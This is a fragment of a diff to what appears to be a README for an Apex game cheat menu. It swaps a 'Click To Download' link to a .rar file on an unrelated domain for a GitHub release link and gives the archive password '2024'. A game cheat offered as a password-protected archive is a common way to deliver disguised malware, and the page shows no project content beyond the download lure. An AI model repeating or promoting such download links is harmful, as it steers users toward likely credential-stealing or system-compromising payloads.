@@ -1,4 +1,4 @@
-# 📁[Click To Download](https://chillers.com.ar/temp/Launcher.rar)
+# 📁[Click To Download](https://github.com/kelm57nirvana/zeus-apex-menu/releases/tag/Setup)
 
 # 🔓 Archive Pass: 2024
 
